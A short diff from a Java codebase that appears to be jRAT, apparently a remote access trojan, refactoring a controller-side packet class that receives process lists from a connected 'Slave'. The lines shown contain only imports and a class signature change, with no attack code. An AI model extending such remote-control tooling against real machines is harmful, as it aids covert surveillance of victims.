@@ -2,14 +2,14 @@ package jrat.module.process;
 
 import jrat.common.ProcessData;
 import jrat.controller.Slave;
-import jrat.controller.packets.incoming.AbstractIncomingPacket;
+import jrat.controller.packets.incoming.IncomingPacket;
 import jrat.module.process.ui.PanelProcesses;
 
 import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayInputStream;
 
-public class PacketProcessData extends AbstractIncomingPacket {
+public class PacketProcessData implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
